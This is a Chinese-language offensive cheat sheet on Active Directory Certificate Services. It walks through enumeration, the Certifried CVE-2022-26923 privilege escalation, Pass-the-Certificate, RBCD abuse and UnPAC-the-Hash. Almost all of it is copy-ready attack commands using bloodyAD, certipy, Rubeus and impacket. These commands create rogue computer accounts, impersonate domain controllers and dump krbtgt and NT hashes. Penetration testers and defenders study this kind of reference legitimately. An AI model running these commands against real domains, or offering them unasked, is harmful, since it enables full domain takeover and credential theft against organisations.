# Active Directory - 证书服务

Active Directory 证书服务（AD CS）是一种 Microsoft Windows 服务器角色，提供公钥基础架构（PKI）。它允许你创建、管理和分发数字证书，这些证书用于保护网络中的通信和事务安全。

## AD CS 枚举

* NetExec：

    ```ps1
    netexec ldap domain.lab -u username -p password -M adcs
    ```

* ldapsearch：

    ```ps1
    ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
    ```

* certutil：

    ```ps1
    certutil.exe -config - -ping
    certutil -dump
    ```

## 证书注册

* 要求 DNS（`CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` 或 `CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS`）：只有设置了 `dNSHostName` 属性的主体才能注册。
    * Active Directory 用户无法注册要求 `dNSHostName` 的证书模板。
    * 计算机在**加入域**时会自动设置 `dNSHostName` 属性，但如果你只是在 AD 中创建一个计算机对象，该属性为空。
    * 计算机对其 `dNSHostName` 属性拥有经过验证的写入权限，意味着它们可以添加与其计算机名匹配的 DNS 名称。

* 要求电子邮件（`CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL` 或 `CT_FLAG_SUBJECT_REQUIRE_EMAIL`）：只有设置了 `mail` 属性的主体才能注册，schema version 1 的模板除外。
    * 默认情况下，用户和计算机都没有设置 `mail` 属性，且它们无法自行修改此属性。
    * 用户可能已设置 `mail` 属性，但计算机设置该属性的情况比较少见。

## Certifried CVE-2022-26923

> 经过身份验证的用户可以操纵其拥有或管理的计算机帐户上的属性，从 Active Directory 证书服务获取证书，从而实现权限提升。

* 查找 `ms-DS-MachineAccountQuota`

  ```ps1
  bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'DC=lab,DC=local' --attr ms-DS-MachineAccountQuota 
  ```

* 在 Active Directory 中添加一台新计算机，默认 `MachineAccountQuota = 10`

  ```ps1
  bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 add computer cve 'CVEPassword1234*'
  certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
  ```

* 【替代方案】如果你是 `SYSTEM` 权限且 `MachineAccountQuota=0`：使用当前机器的票据并重置其 SPN

  ```ps1
  Rubeus.exe tgtdeleg
  export KRB5CCNAME=/tmp/ws02.ccache
  bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local set object 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName
  ```

* 将 `dNSHostName` 属性设置为与域控制器主机名匹配

  ```ps1
  bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 set object 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName -v DC.lab.local
  bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'CN=cve,CN=Computers,DC=lab,DC=local' --attr dNSHostName
  ```

* 请求票据

  ```ps1
  # certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA
  certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA
  ```

* 使用 pfx 证书或在计算机帐户上设置 RBCD 来接管域

  ```ps1
  certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10

  openssl pkcs12 -in dc.pfx -out dc.pem -nodes
  bloodyAD -d lab.local  -c ":dc.pem" -u 'cve$' --host 10.10.10.10 add rbcd 'CRASHDC$' 'CVE$'
  getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   
  secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
  ```

## 传递证书（Pass-The-Certificate）

> 利用传递证书技术获取 TGT，该技术应用于"UnPAC the Hash"和"影子凭据"攻击中。

* Windows

  ```ps1
  # 查看证书文件信息
  certutil -v -dump admin.pfx

  # 从 Base64 编码的 PFX 证书
  Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show

  # 授予用户 DCSync 权限
  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
  # 恢复
  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
  ```

* Linux

  ```ps1
  # Base64 编码的 PFX 证书（字符串）（可设置密码）
  gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
  ​
  # PEM 证书（文件）+ PEM 私钥（文件）
  gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

  # PFX 证书（文件）+ 密码（字符串，可选）
  gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

  # 使用 Certipy
  certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
  certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
  ```

### PKINIT 错误

当域控制器不支持 **PKINIT**（通过证书获取 TGT 或 NT Hash 的预身份验证方式）时，你会在工具输出中看到如下错误。

```ps1
$ certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
[...]
KDC_ERROR_CLIENT_NOT_TRUSTED (Reserved for PKINIT)
```

但仍有办法利用该证书接管帐户。

* 使用证书打开 LDAP Shell

    ```ps1
    certipy auth -pfx target.pfx -debug -username username -domain domain.local -dns-tcp -dc-ip 10.10.10.10 -ldap-shell
    ```

* 添加计算机以进行 RBCD

    ```ps1
    impacket-addcomputer -dc-ip 10.10.10.10 DOMAIN.LOCAL/User:P@ssw0rd -computer-name "NEWCOMPUTER" -computer-pass "P@ssw0rd123*"
    ```

* 设置 RBCD

    ```ps1
    set_rbcd 'TARGET$' 'NEWCOMPUTER$'
    ```

* 使用模拟请求票据

    ```ps1
    impacket-getST -spn 'cifs/target.domain.local' -impersonate 'target$' -dc-ip 10.10.10.10 'DOMAIN.LOCAL/NEWCOMPUTER$:P@ssw0rd123*'
    ```

* 使用票据

    ```ps1
    export KRB5CCNAME=DC$.ccache
    impacket-secretsdump.py 'target$'@target.domain.local -k -no-pass -dc-ip 10.10.10.10 -just-dc-user 'krbtgt'
    ```

## UnPAC The Hash

使用 **UnPAC The Hash** 方法，你可以通过用户的证书获取其 NT Hash。

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

  ```ps1
  export KRB5CCNAME=/pwd/to/user.ccache
  proxychains certipy req -username "user@domain.lab" -ca "domain-DC-CA" -target "dc1.domain.lab" -template User -k -no-pass -dns-tcp -ns 10.10.10.10 -dc-ip 10.10.10.10
  proxychains certipy auth -pfx 'user.pfx' -dc-ip 10.10.10.10 -username user -domain domain.lab
  ```

* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

  ```ps1
  # 使用证书请求票据并通过 /getcredentials 获取 PAC 中的 NT Hash
  Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
  ```

* [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)

  ```ps1
  # 通过验证 PKINIT 预身份验证获取 TGT
  gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
  
  # 使用会话密钥恢复 NT Hash
  export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
  ```

## 常见错误信息

| 错误名称 | 描述 |
| ---------- | ----------- |
| `CERTSRV_E_TEMPLATE_DENIED` | 证书模板的权限不允许当前用户注册 |
| `KDC_ERR_INCONSISTENT_KEY_PURPOSE` | 证书无法用于 PKINIT 客户端身份验证 |
| `KDC_ERROR_CLIENT_NOT_TRUSTED` | PKINIT 保留错误。尝试向另一个域控制器进行身份验证 |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | KDC 不支持该 padata 类型。CA 可能已过期 |

`KDC_ERR_PADATA_TYPE_NOSUPP` 错误仍然允许攻击者使用传递证书（Pass-The-Cert）技术，因为域控制器的 LDAPS 服务仅检查 SAN。

## 参考资料

* [Access controls - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/access-controls)
* [AD CS Domain Escalation - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#shell-access-to-adcs-ca-with-yubihsm-esc12)
* [ADCS Attack Paths in BloodHound — Part 2 - Jonas Bülow Knudsen - May 1, 2024](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547)
* [bloodyAD and CVE-2022-26923 - soka - 11 May 2022](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
* [CA configuration - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration)
* [Certificate templates - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates)
* [Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)
* [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
* [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
* [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
* [Diving Into AD CS: Exploring Some Common Error Messages - Jacques Coertze - March 7, 2025](https://sensepost.com/blog/2025/diving-into-ad-cs-exploring-some-common-error-messages/)
* [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
* [UnPAC the hash - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)
* [Web endpoints - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints)
